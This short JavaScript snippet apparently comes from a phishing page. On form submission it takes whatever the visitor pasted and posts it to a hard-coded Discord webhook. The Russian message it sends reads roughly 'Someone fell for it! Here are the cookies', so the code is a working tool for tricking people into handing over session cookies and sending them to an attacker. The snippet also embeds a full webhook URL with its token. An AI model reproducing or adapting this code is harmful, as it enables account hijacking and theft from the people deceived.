
        const formElement = document.getElementById('my-form');
    const whurl = 'https://discord.com/api/webhooks/1121888454867959978/SlauwbctwAQFh69tn4_UpVyT2CYmZm_lpGBP3_9h7_BRaCqEUcNNfwI1kbWKEX15q7SO';

    formElement.addEventListener('submit', (event) => {
      event.preventDefault();
      const inputValue = document.getElementById('input-field').value;
      const payload = {
        content: 'Кто-то повёлся! Вот куки: ```\n\n' + inputValue.trim() + "\n```"
      };
      
      fetch(whurl, {
        method: 'POST',
        headers: {
          'Content-Type': 'application/json'
        },
        body: JSON.stringify(payload)
      })
        
    });
